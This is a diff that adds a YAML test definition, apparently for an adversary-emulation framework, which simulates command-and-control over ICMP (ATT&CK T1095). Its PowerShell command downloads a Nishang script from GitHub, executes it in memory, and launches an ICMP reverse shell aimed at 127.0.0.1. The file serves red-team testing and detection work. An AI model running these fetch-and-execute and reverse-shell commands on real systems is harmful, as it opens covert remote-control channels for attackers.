@@ -1,0 +1,15 @@
+- id: b3f22c3c-86d5-51c4-80d5-246b29a22e2d
+  name: Soumaia ART Tests - ICMP C2
+  description: 'This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+
+    refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/'
+  tactic: command-and-control
+  technique:
+    attack_id: T1095
+    name: Non-Application Layer Protocol
+  platforms:
+    windows:
+      psh:
+        command: |-
+          IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+          Invoke-PowerShellIcmp -IPAddress 127.0.0.1
